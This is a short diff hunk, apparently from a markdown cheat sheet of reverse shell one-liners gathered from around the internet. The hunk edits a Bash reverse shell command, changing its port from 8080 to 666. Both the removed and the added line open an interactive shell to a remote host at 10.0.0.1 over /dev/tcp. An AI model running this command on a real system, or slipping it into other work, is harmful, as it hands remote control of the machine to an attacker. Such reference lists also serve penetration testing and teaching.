@@ -9,7 +9,7 @@ You can find them all around the internet. I couldn't find them all in one place
 **Bash**
 
 ```
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/10.0.0.1/666 0>&1
 ```
 
 
